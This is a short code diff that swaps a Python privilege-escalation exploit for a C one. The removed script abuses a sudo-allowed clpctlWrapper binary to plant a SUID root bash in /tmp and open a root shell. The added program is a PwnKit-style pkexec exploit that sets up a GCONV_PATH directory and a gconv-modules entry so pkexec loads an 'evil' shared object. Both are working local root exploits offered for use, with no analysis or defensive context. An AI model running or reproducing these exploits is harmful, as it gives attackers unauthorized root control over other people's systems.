@@ -1,28 +1,28 @@
-import os
-import subprocess
+#include <stdio.h>
+#include <stdlib.h>
 
-def exec_command(command):
-    # Apre il file di output
-    with open('/tmp/out.txt', 'a') as outfile:
-        # Aggiunge l'output del comando al file
-        process = subprocess.Popen(command.split(), stdout=outfile, stderr=outfile)
-        process.communicate()
+#define BIN "/usr/bin/pkexec"
+#define DIR "evildir"
+#define EVILSO "evil"
 
-def exploit():
-    print('[+] Overriding file to writable')
-    exec_command('sudo /usr/bin/clpctlWrapper system:permissions:reset --files=777 --path=../../../../../../../../../../usr/bin/clpctlWrapper')
-    print('[+] Backup clpctlWrapper into tmp...')
-    exec_command('cp /usr/bin/clpctlWrapper /tmp/clpctlWrapper')
-    print('[+] Replacing clpctlWrapper with cp...')
-    exec_command('cp /bin/bash /tmp/bash')
-    print('[+] Assigning suid to /tmp/bash...')
-    exec_command('cp /bin/chown /usr/bin/clpctlWrapper')
-    exec_command('sudo /usr/bin/clpctlWrapper root:root /tmp/bash')
-    exec_command('cp /bin/chmod /usr/bin/clpctlWrapper')
-    exec_command('sudo /usr/bin/clpctlWrapper 6755 /tmp/bash')
-    exec_command('cp /tmp/clpctlWrapper /usr/bin/clpctlWrapper')
-    print('[+] Popping root shell...')
-    os.system('/tmp/bash -p -c "chown root:root /usr/bin/clpctlWrapper && chmod 0700 /usr/bin/clpctlWrapper && python3 root.py"')
+int main()
+{
+    char *envp[] = {
+        DIR,
+        "PATH=GCONV_PATH=.",
+        "SHELL=ryaagard",
+        "CHARSET=ryaagard",
+        NULL
+    };
+    char *argv[] = { NULL };
 
-if __name__ == '__main__':
-    exploit()
+    system("mkdir GCONV_PATH=.");
+    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
+    system("mkdir " DIR);
+    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
+    system("cp " EVILSO ".so " DIR);
+
+    execve(BIN, argv, envp);
+
+    return 0;
+}
